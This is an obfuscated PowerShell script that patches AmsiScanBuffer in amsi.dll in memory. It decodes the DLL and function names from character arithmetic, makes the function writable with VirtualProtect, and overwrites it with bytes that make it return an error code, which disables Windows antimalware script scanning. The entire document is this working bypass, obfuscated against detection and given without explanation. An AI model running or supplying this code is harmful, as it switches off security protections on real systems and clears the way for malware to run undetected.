$tIruas6e7 = @"
using System;
using System.Runtime.InteropServices;
public class tIruas6e7 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr cQr0wBPdBBMz5, string BN5Cu);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Udw5oM, UIntPtr PWz, uint D4rwtqHMe, out uint FJ8Dm71e2_WgKHYpchY);
}
"@

Add-Type $tIruas6e7

$AD5 = [tIruas6e7]::LoadLibrary("$([CHar](97+42-42)+[ChAR](41+68)+[char]([bYte]0x73)+[CHAr]([byte]0x69)+[ChaR](7+39)+[chAR](100+26-26)+[chAr]([bYTE]0x6c)+[CHAr]([BYTE]0x6c))")
$E9ckh2Jp = [tIruas6e7]::GetProcAddress($AD5, "$(('ÁmsîScán'+'Bûffér').nORMalize([ChAR]([bYTE]0x46)+[CHAr](111*9/9)+[cHAr](41+73)+[ChAR](109)+[ChaR](68)) -replace [CHAR](92+47-47)+[cHaR](66+46)+[ChAR]([BYtE]0x7b)+[CHar](77*3/3)+[ChAr](110*90/90)+[cHar]([bYtE]0x7d))")
$p = 0
[tIruas6e7]::VirtualProtect($E9ckh2Jp, [uint32]5, 0x40, [ref]$p)
$w_0C7JT_8LIC0kC7iO9N = "0xB8"
$vTVkKiUhIZe7O3ZSbdXd = "0x57"
$seliEYkgL0PMPJb = "0x00"
$TDryCeivDJJO0nCcNPrX = "0x07"
$k36ZB8neXZ = "0x80"
$I28nwIW3q3I = "0xC3"
$A0osnNgyXsTRXq = [Byte[]] ($w_0C7JT_8LIC0kC7iO9N,$vTVkKiUhIZe7O3ZSbdXd,$seliEYkgL0PMPJb,$TDryCeivDJJO0nCcNPrX,+$k36ZB8neXZ,+$I28nwIW3q3I)
[System.Runtime.InteropServices.Marshal]::Copy($A0osnNgyXsTRXq, 0, $E9ckh2Jp, 6)